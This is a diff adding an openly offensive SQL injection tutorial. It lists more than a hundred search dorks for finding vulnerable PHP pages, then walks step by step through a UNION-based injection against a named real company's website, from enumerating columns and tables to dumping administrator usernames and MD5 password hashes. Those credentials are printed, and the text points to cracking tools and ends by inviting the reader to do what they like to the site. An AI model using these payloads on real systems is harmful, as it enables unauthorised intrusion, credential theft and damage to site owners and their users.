@@ -1,0 +1,306 @@
+In this tutorial you will understand how SQL INJECTION DONE in a very simple way.
+
+SQL INJECTION is an attack technique used to exploit web sites by altering backend SQL statements through manipulating application input.
+
+Here we go!!
+
+1). Search for a vulnerable site.
+Highlight one then press ctrl+c then ctrl+v at your browser address bar.
+allinurl:index.php?id=
+allinurl:trainers.php?id=
+allinurl:buy.php?category=
+allinurl:article.php?ID=
+allinurl:play_old.php?id=
+allinurl:newsitem.php?num=
+allinurl:readnews.php?id=
+allinurl:top10.php?cat=
+allinurl:historialeer.php?num=
+allinurl:reagir.php?num=
+allinurl:Stray-Questions-View.php?num=
+allinurl:forum_bds.php?num=
+allinurl:game.php?id=
+allinurl:view_product.php?id=
+allinurl:newsone.php?id=
+allinurl:sw_comment.php?id=
+allinurl:news.php?id=
+allinurl:avd_start.php?avd=
+allinurl:event.php?id=
+allinurl:product-item.php?id=
+allinurl:sql.php?id=
+allinurl:news_view.php?id=
+allinurl:select_biblio.php?id=
+allinurl:humor.php?id=
+allinurl:aboutbook.php?id=
+allinurl:ogl_inet.php?ogl_id=
+allinurl:fiche_spectacle.php?id=
+allinurl:communique_detail.php?id=
+allinurl:sem.php3?id=
+allinurl:kategorie.php4?id=
+allinurl:news.php?id=
+allinurl:index.php?id=
+allinurl:faq2.php?id=
+allinurl:show_an.php?id=
+allinurl:preview.php?id=
+allinurl:loadpsb.php?id=
+allinurl:opinions.php?id=
+allinurl:spr.php?id=
+allinurl:pages.php?id=
+allinurl:announce.php?id=
+allinurl:clanek.php4?id=
+allinurl:participant.php?id=
+allinurl:download.php?id=
+allinurl:main.php?id=
+allinurl:review.php?id=
+allinurl:chappies.php?id=
+allinurl:read.php?id=
+allinurl:prod_detail.php?id=
+allinurl:viewphoto.php?id=
+allinurl:article.php?id=
+allinurl:person.php?id=
+allinurl:productinfo.php?id=
+allinurl:showimg.php?id=
+allinurl:view.php?id=
+allinurl:website.php?id=
+allinurl:hosting_info.php?id=
+allinurl:gallery.php?id=
+allinurl:rub.php?idr=
+allinurl:view_faq.php?id=
+allinurl:artikelinfo.php?id=
+allinurl:detail.php?ID=
+allinurl:index.php?=
+allinurl:profile_view.php?id=
+allinurl:category.php?id=
+allinurl:publications.php?id=
+allinurl:fellows.php?id=
+allinurl:downloads_info.php?id=
+allinurl:prod_info.php?id=
+allinurl:shop.php?do=part&id=
+allinurl:productinfo.php?id=
+allinurl:collectionitem.php?id=
+allinurl:band_info.php?id=
+allinurl:product.php?id=
+allinurl:releases.php?id=
+allinurl:ray.php?id=
+allinurl:produit.php?id=
+allinurl:pop.php?id=
+allinurl:shopping.php?id=
+allinurl:productdetail.php?id=
+allinurl:post.php?id=
+allinurl:viewshowdetail.php?id=
+allinurl:clubpage.php?id=
+allinurl:memberInfo.php?id=
+allinurl:section.php?id=
+allinurl:theme.php?id=
+allinurl:page.php?id=
+allinurl:shredder-categories.php?id=
+allinurl:tradeCategory.php?id=
+allinurl:product_ranges_view.php?ID=
+allinurl:shop_category.php?id=
+allinurl:transcript.php?id=
+allinurl:channel_id=
+allinurl:item_id=
+allinurl:newsid=
+allinurl:trainers.php?id=
+allinurl:news-full.php?id=
+allinurl:news_display.php?getid=
+allinurl:index2.php?option=
+allinurl:readnews.php?id=
+allinurl:top10.php?cat=
+allinurl:newsone.php?id=
+allinurl:event.php?id=
+allinurl:product-item.php?id=
+allinurl:sql.php?id=
+allinurl:aboutbook.php?id=
+allinurl:preview.php?id=
+allinurl:loadpsb.php?id=
+allinurl:pages.php?id=
+allinurl:clanek.php4?id=
+allinurl:announce.php?id=
+allinurl:chappies.php?id=
+allinurl:read.php?id=
+allinurl:viewapp.php?id=
+allinurl:viewphoto.php?id=
+allinurl:rub.php?idr=
+allinurl:galeri_info.php?l=
+allinurl:review.php?id=
+allinurl:iniziativa.php?in=
+allinurl:curriculum.php?id=
+allinurl:labels.php?id=
+allinurl:story.php?id=
+allinurl:look.php?ID=
+allinurl:newsone.php?id=
+allinurl:aboutbook.php?id=
+
+2.Suppose we have this one.
+
+http://www.shangproperties.com/news_archive.php?id=6
+
+We will check it's vulnerability by adding magic qoute (') at the end of the url.
+
+3.So the url will be like this:
+
+http://www.shangproperties.com/news_archive.php?id=6'
+
+And we hit enter and we got this result.
+Database error: Invalid SQL: SELECT * FROM NewsArticle WHERE NewsID=6\';
+mySQL Error: 1064 (You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1)
+Database error: next_record called with no query pending.
+mySQL Error: 1064 (You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1)
+
+
+If you got an error, some text missing or a blank page the site is vulnerable but not at all.
+
+Now we know that the site is vulnerable.
+
+4.The next step is find out how many columns the database contain
+To find it we use "order by" (without the qoute) and this string " -- " (no qoute).
+
+It will look like this:
+
+http://www.shangproperties.com/news_archive.php?id=6 order by 1-- (no error)
+http://www.shangproperties.com/news_archive.php?id=6 order by 2-- (no error)
+http://www.shangproperties.com/news_archive.php?id=6 order by 3-- (no error)
+
+we move a little higher. (it doesn't matter)
+
+http://www.shangproperties.com/news_archive.php?id=6 order by 10-- (no error)
+http://www.shangproperties.com/news_archive.php?id=6 order by 14-- (no error)
+
+until we got an error:
+
+http://www.shangproperties.com/news_archive.php?id=6 order by 15-- (we got an error)
+
+now we got an error on this column:it will lok like this.
+Database error: Invalid SQL: SELECT * FROM NewsArticle WHERE NewsID=6 order by 15--;
+mySQL Error: 1054 (Unknown column '15' in 'order clause')
+Database error: next_record called with no query pending.
+mySQL Error: 1054 (Unknown column '15' in 'order clause')
+
+this mean the database contain only 14 columns.
+
+5.. Now use "-" (negative quote) and union select statement.
+
+using this we can select more data in one sql statement.
+
+Look like this:
+
+http://www.shangproperties.com/news_archive.php?id=-6 union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14--
+
+we hit enter.
+
+numbers appears..
+Like this:
+6
+, 5
+
+8
+
+
+6.Now we will check it's MYSQL VERSION. We will add @@version on the numbers appear on the previous step.
+
+lemme say i choose 8.. we will replace 8 with @@version,so it will look like this.
+
+http://www.shangproperties.com/news_archive.php?id=-6 union select 1, 2, 3, 4, 5, 6, 7, @@version, 9, 10, 11, 12, 13, 14--
+
+and you will get a result like this:
+6
+, 5
+
+5.1.32 <--this is the version
+
+
+now we get the version: ;-)
+
+7.Getting Table Name.
+
+We use group_concat(table_name).
+replace @@version with group_concat(table_name)
+
+and look like this:
+http://www.shangproperties.com/news_archive.php?id=-6 union select 1, 2, 3, 4, 5, 6, 7, group_concat(table_name), 9, 10, 11, 12, 13, 14--
+
+were not done already: (don't hit enter)
+
+between number 14 and this "--" (quote) insert this:
+
++from+information_schema.tables+where+table_schema=database()--
+
+it will look like this:
+
+http://www.shangproperties.com/news_archive.php?id=-6 union select 1, 2, 3, 4, 5, 6, 7, group_concat(table_name), 9, 10, 11, 12, 13, 14+from+information_schema.tables+where+table_schema=database()--
+
+we hit enter and got this result:
+Blurb,FileUpload,Inquiries,NewsArticle,ProjectPhoto,active_sessions_split,auth_u?ser_md5
+
+8. Now we're done on TABLE NAME, we move on to COLUMN NAME.
+
+use this string group_concat(column_name)
+
+replace group_concat(table_name) to group_concat(column_name).
+
+but before that we must choose one column. i choose auth_user_md5 because this is must or what we want.
+
+for better result we need to hex auth_user_md5.
+
+Go to this Link: Click here!
+
+paste auth_user_md5 to the text box and click encode.
+
+now we get the hex of auth_user_md5: look like this: 61 75 74 68 5f 75 73 65 72 5f 6d 64 35
+
+before proceeding remove space between each numbers. like this: 617574685f757365725f6d6435
+
+Now replace group_concat(table_name) to group_concat(column_name).
+
+like this:
+http://www.shangproperties.com/news_archive.php?id=-6 union select 1, 2, 3, 4, 5, 6, 7, group_concat(column_name), 9, 10, 11, 12, 13, 14+from+information_schema.tables+where+table_schema=database()--
+
+replace also +from+information_schema.tables+where+table_schema=database()--
+to
++from+information_schema.columns+where+table_name=0x617574685f757365725f6d6435--
+
+(The yellow letter and numbers is the auth_user_md5 hex we encoded)
+
+Note: always add 0x before the hex. Like above.
+
+Here is the result:
+
+http://www.shangproperties.com/news_archive.php?id=-6 union select 1, 2, 3, 4, 5, 6, 7, group_concat(column_name), 9, 10, 11, 12, 13, 14+from+information_schema.columns+where+table_name=0x617574685f757365725f6d6435--
+
+Now hit enter: and you got result like this.
+UserID,Username,Password,Perms,FirstName,MiddleName,LastName,Position,EmailAddre ?ss,ContactNumbers,DateCreated,CreatedBy,DateModified,ModifiedBy,Status
+
+9.We use 0x3a to obtain what we want from the DATABASE like pass, username, etc..etc..
+
+Replace group_concat(column_name) to group_concat(UserID,0x3a,Username,0x3a,Password,0x3a,Perms,0x3a,FirstName,0x3a,M ? iddleName,0x3a,LastName,0x3a,Position,0x3a,EmailAddress,0x3a,ContactNumbers,0x3a ? ,DateCreated,0x3a,CreatedBy,0x3a,DateModified,0x3a,ModifiedBy,0x3aStatus)
+
+but i prefer to do this one group_concat(Username,0x3a,Password) for less effort.
+
+and replace also information_schema.columns+where+table_name=0x617574685f757365725f6d6435-- to +from+auth_user_md5--
+
+617574685f757365725f6d6435 is the hex value of auth_user_md5 so we replace it.
+
+Result look like this:
+
+http://www.shangproperties.com/news_archive.php?id=-6 union select 1, 2, 3, 4, 5, 6, 7,group_concat(Username,0x3a,Password), 9, 10, 11, 12, 13, 14+from+auth_user_md5--
+
+i hit enter we got this:
+admin username: k2admin / admin
+password in md5 hash:21232f297a57a5a743894a0e4a801fc3 / 97fda9951fd2d6c75ed53484cdc6ee2d
+
+10.Because the password is in md5 hash we need to crack it.
+
+Go to this link:Click here!
+
+or download this md5 hash cracker:
+Click here!
+
+pass: x1R0zYB3bex
+
+and admin page finder:
+Click Here!
+
+For some usefull Sql injection tools go to this thread: Click here!
+
+Were done it's up to you what you want to do to the site after cracking the md5.
+congratulation!!!
